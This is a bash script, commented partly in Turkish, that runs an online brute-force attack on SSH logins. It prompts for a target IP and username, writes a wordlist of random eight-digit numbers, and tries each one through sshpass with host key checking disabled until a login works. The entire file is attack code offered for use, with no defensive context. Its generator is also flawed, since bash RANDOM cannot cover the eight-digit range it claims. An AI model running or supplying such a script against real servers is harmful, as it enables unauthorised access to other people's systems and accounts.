#!/bin/bash

# Brute Force SSH Authentication Script

# Kullanıcıdan girdileri al
read -p "Target IP: " TARGET_IP
read -p "Username: " USERNAME
read -p "Path to save the generated wordlist: " WORDLIST

if [ -z "$TARGET_IP" ] || [ -z "$USERNAME" ] || [ -z "$WORDLIST" ]; then
    echo "All inputs are required. Please provide Target IP, Username, and Path to save the generated wordlist."
    exit 1
fi

if ! command -v sshpass &> /dev/null; then
    echo "sshpass could not be found, please install it first."
    exit 1
fi

echo "Generating wordlist with 10,000 passwords of 8 digits each..."

# Wordlist oluşturma
for i in $(seq 1 10000); do
    printf "%08d\n" $((RANDOM % 100000000)) >> "$WORDLIST"
done

echo "Wordlist created at $WORDLIST"
echo "Starting brute force attack on $TARGET_IP with username $USERNAME using generated wordlist"

while IFS= read -r password; do
    # SSH bağlantısı denemesi
    sshpass -p "$password" ssh -o StrictHostKeyChecking=no -o ConnectTimeout=5 "$USERNAME@$TARGET_IP" "exit" &>/dev/null
    
    if [ $? -eq 0 ]; then
        echo "Password found: $password"
        exit 0
    else
        echo "Failed attempt with password: $password"
    fi
done < "$WORDLIST"

echo "Password not found in the wordlist"
exit 1
